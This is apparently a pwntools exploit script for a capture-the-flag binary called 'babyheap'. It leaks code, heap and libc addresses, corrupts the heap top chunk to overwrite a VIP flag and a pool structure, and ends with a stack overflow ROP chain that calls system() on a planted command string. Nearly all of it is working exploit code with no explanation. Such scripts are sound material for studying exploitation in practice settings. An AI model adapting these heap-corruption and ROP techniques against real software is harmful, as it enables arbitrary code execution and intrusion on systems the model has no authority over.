from pwn import *
local = 1
bin=ELF('./babyheap')
code_base=0
heap_base=0
if local:
    p=process('./babyheap')
    context.log_level="debug"
    libc=ELF("./libc-2.23.so")
else:
    p=None
    pass

def login_and_leak_codeaddr():
    global code_base 
    bias=0x55a3c0866a0a-0x55a3c0866000
    p.recvuntil("What's your name?")
    p.send("\n")
    p.recvuntil("Hello ")
    addr=u64(p.recv(6).ljust(8,"\x00"))
    #print ">"*20,hex(addr)
    code_base = addr-bias
    print "code_base=",hex(code_base)
    p.recvuntil('password: ')
    p.send("Fourscore and seven years ago ou")
    
def have_view():
    p.recvuntil("pool used? (y/n)")
    p.sendline('y')
    
def use_the_pool(size,buff):
    p.recvuntil("use the pool? (y/n)")
    p.sendline('y')
    p.recvuntil('size of your pool: ')
    p.sendline(str(size))
    p.recvuntil('blank(?):')
    p.send(buff)
    have_view()

    
def leak_heap_bias():
    use_the_pool(24,"A"*16+"\x00"*8+"\xff"*8)
    use_the_pool(-112-32-16,"CCCCCCCCCCCCCCC")
    use_the_pool(24,"a"*16)
    p.recvuntil('a'*16)    
    heap_addr=u64(p.recv(6).ljust(8,"\x00"))
    heap_base=heap_addr-0xc0
    print "code_base:",hex(code_base)
    print "heap_base:",hex(heap_base)
    print "heap_base-code_base=",heap_base-code_base
    return heap_base-code_base
    
def change_vip():
    use_the_pool(24,"A"*16+"\x00"*8+"\xff"*8)
    topchunk_addr=heap_base+0x0f0
    vip_addr=code_base+0x2030e0

    offset=vip_addr-32-16-topchunk_addr-16
    print "offset=",offset
    print "vip_addr=",hex(vip_addr)
    print "topchunk_addr",hex(topchunk_addr) 
    use_the_pool(offset,"\n")
    use_the_pool(32,p64(0x80000000))
    use_the_pool(16,"\n")
    
def change_vip_and_get_libcaddr():
    use_the_pool(24,"A"*16+"\x00"*8+"\xff"*8)
    topchunk_addr=heap_base+0x0f0
    vip_addr=code_base+0x2030e0
    got_malloc=code_base+0x202f30
    malloc_size=vip_addr-got_malloc-32-16
    offset=got_malloc-32-16-topchunk_addr-16
    print "offset=",offset
    print "got_malloc=",hex(got_malloc)
    print "malloc_size=",malloc_size
    print "topchunk_addr",hex(topchunk_addr)
    gdb.attach(p)
    raw_input()    
    use_the_pool(offset,"\n")
    use_the_pool(malloc_size,"\n")
    p.recvuntil("left in the pool:")
    got_addr=u64(p.recv(6).ljust(8,"\x00"))
    print "got_addr=",hex(got_addr)
    use_the_pool(16,p64(0x80000000))
 
def change_vip2():
    global libc
    use_the_pool(24,"A"*16+"\x00"*8+"\xff"*8)
    topchunk_addr=heap_base+0x0f0
    poollist2=code_base+0x203060+8+8
    vip_addr=code_base+0x2030e0
    padding=vip_addr-poollist2-16
    offset=poollist2-32-16-topchunk_addr-16
    print "offset=",offset
    print "poollist2=",hex(poollist2)
    print "topchunk_addr",hex(topchunk_addr) 
    fake_struct=p64(code_base+0x202f50)+p32(2)+p16(2)+p16(100)+"ls\x00"
    use_the_pool(offset,fake_struct)###heap_base+0x100
    #gdb.attach(p)
    #raw_input()
    payload=p64(heap_base+0x100)+p64(heap_base+0x100)+"A"*padding+p64(0x80000000)+p64(3)
    use_the_pool(len(payload),payload)
    p.recvuntil("left in the pool:")
    got_addr=u64(p.recv(6).ljust(8,"\x00"))
    print "got_addr=",hex(got_addr)
    libc.address=got_addr-libc.symbols[b'puts']
    print "libc_base",hex(libc.address)
    #gdb.attach(p)
    #raw_input()
    
    
if __name__ =="__main__":
    global p
    global heap_base
    login_and_leak_codeaddr()
    heap_bias= leak_heap_bias()
    if local:
        p=process('./babyheap')
        context.log_level="debug"
    else:
        p=None
        pass
    login_and_leak_codeaddr()
    heap_base=code_base+heap_bias
    #change_vip_and_get_libcaddr()
    change_vip2()
    print p.recvuntil("Only VIP can leave some message for me: ")
    pop_rdi_ret=code_base+0x13a3
    cmd_addr=heap_base+0x100+16
    payload="A"*0x20+"B"*8
    payload+=p64(pop_rdi_ret)+p64(cmd_addr)+p64(libc.symbols[b"system"])
    #gdb.attach(p)
    #raw_input()
    p.sendline(payload)
    print p.recvrepeat(1)
